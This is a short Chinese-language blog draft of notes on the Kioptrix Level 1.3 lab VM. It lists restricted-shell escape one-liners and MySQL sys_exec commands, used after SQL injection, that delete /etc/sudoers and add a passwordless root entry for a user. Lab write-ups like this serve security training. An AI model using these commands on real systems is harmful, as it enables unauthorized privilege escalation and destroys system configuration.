
+++
title = 'KIOPTRIX LEVEL 1.3 (#4)'
date = '2023-12-07T16:08:29+08:00'
draft = true
+++
```
python -c 'import pty; pty.spawn ("/bin/sh")'
echo os.system ('/bin/bash')
/bin/sh -i
perl —e 'exec "/bin/sh";'
perl: exec "/bin/sh";
ruby: exec "/bin/sh"
lua: os.execute ('/bin/sh')
exec "/bin/sh"
```

先贴上一些常用的从受限制shell逃逸的命令，大部分命令是利用主机上安装的脚本语言，来运行一些命令执行的函数，如python的os.system()，lua的os.exec()函数，利用函数运行/bin/bash或/bin/sh等shell应用，切换到无限制shell。

```
select sys_exec('rm -r /etc/sudoers');
select sys_exec('chmod 0440 /etc/sudoers');
select sys_exec('echo "john ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers');
```

sql注入获得数据库权限，利用自建函数，sys_exec 将用户john加入超级用户文件sudoers![image-20230208170613569](C:\Users\root\AppData\Roaming\Typora\typora-user-images\image-20230208170613569.png)

![image-20230208170506879](C:\Users\root\AppData\Roaming\Typora\typora-user-images\image-20230208170506879.png)

![image-20230208170458827](C:\Users\root\AppData\Roaming\Typora\typora-user-images\image-20230208170458827.png)

![image-20230208170728394](C:\Users\root\AppData\Roaming\Typora\typora-user-images\image-20230208170728394.png)